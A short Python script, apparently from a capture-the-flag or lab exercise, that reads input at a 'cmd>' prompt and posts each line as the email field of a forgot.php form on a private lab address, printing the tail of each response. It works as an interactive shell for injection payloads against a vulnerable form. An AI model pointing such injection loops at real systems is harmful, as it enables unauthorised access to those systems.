import requests

base_url = "http://10.129.67.147/cmsdata/forgot.php"

while True:
    payload = input("cmd> ")

    if payload.lower() in ("exit", "quit"):
        break

    data = {"email" : payload}

    response = requests.post(base_url, data=data)

    print(response.content[-300:])
